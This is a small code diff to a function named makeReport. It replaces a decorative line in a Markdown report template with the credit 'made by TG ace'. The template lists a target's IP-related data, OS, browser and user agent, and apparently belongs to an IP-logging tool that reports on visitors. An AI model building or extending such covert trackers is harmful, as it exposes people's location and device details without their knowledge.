@@ -165,8 +165,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
-> ˚　　　　✦　　　.　　. 　 ˚　.　　　　　 . ✦　　　 　˚　　　　 . ★⋆.
-　　　.   　　˚　　 　　*　　 　　✦　　　.　　.　　　✦　˚ 　　　　 ˚　.˚　　　　　　.　　. 　 ˚　.　　　　 　　 　　　　 ✦
+> __made by TG ace__
 
 **User Agent:**
 ```
